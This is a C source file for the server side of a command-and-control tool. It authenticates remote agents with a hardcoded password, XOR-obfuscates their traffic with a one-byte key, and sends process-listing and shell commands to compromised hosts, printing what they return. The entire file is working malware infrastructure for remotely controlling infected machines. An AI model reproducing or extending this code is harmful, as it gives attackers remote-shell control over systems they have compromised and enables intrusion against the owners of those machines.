#include <stdio.h>
#include <string.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "c2_modules.h"
#define BUFFER_SIZE 2048
#define TRAFFIC_KEY 0x02

int AuthClient(char *recv_buf){

	// Authenticate client via tokenizing the received buffer
	
	char* token;
	//char* NextToken = NULL;
	char* LastToken = NULL;
	token = strtok(recv_buf, "-");
	// Checks for delimiter
	while (token != NULL) {
		printf("%s\n", token);
		LastToken = token;
		
		// go through other tokens
		token = strtok(NULL, "-");
	}
	
	printf("password string is %s\n", LastToken);
	
	if (strcmp(LastToken,"qawsed") != 0){printf("[x] exiting\n");return -1;}
	printf("[+] AGENT AUTH SUCCESS\n");
	return 0;
}

void decrypt(unsigned char* recv_buf, size_t recv_buf_size) {
	//printf("[+] DECRYPTING with '%c' key\n", key);
	for (int i = 0; i < recv_buf_size; i++) {
		//printf("\\x%02x", magic[i] ^ key);
		recv_buf[i] = recv_buf[i] ^ TRAFFIC_KEY;
	}
	//printf("\n");
	return;
}
void encrypt(unsigned char* recv_buf, size_t recv_buf_size) {
	//printf("[+] DECRYPTING with '%c' key\n", key);
	for (int i = 0; i < recv_buf_size; i++) {
		//printf("\\x%02x", magic[i] ^ key);
		recv_buf[i] = recv_buf[i] ^ TRAFFIC_KEY;
	}
	//printf("\n");
	return;
}

void HandleLspid(char *cmd,int client_socket){

	ssize_t sent_bytes = 0;
	ssize_t bytes_received = 0;
	
	sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
	if (sent_bytes == -1){
		printf("[x] send() failed\n");
		return;
	}

	char recv_buf[BUFFER_SIZE] = {0};
		
    int done_receiving = 0;
    
    do {
        bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
        if (bytes_received < 0) {
            perror("[x] recv() failed\n");
            exit(EXIT_FAILURE);
        }
        
        if (bytes_received > 0) {
            
            decrypt( (unsigned char *)recv_buf,(size_t) bytes_received);
            recv_buf[bytes_received] = '\0'; // Null-terminate
            
            // Check if this chunk contains "done"
            if (strstr(recv_buf, "[DONE]") != NULL) {
                // Remove "done" from output
                char* done_pos = strstr(recv_buf, "[DONE]");
                *done_pos = '\0'; // Truncate at "done"
                done_receiving = 1;
            }
            
            printf("%s", recv_buf);
        }
        
    } while (!done_receiving && bytes_received > 0);
	return;
}

void HandleShell(char *cmd,int client_socket) {
	ssize_t sent_bytes = 0;
	ssize_t bytes_received = 0;
	
	sent_bytes = send(client_socket,cmd,(size_t) strlen(cmd),0);
	if (sent_bytes == -1){
		printf("[x] send() failed\n");
		return;
	}

	while (1){

		char recv_buf[BUFFER_SIZE] = {0};
		bytes_received = recv(client_socket, recv_buf, BUFFER_SIZE - 1, 0);
	        if (bytes_received < 0) {
	            perror("[x] recv() failed\n");
	            exit(EXIT_FAILURE);
	        }
	    printf("%s",recv_buf);
	}
 	
 	return;
 }
